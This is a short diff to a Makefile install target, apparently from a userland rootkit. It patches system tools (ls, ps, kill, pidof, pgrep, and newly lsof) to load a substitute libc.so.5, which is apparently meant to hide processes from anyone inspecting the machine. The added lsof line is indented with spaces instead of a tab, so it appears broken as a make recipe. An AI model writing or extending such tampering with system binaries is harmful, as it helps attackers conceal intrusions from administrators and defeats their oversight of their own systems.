@@ -77,6 +77,7 @@ install:
 
 	$(PATCH) $(LIBDIR)/libc.so.5 /bin/ls
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which ps)
+    $(PATCH) $(LIBDIR)/libc.so.5 $$(which lsof)
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which kill)
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pidof)
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pgrep)
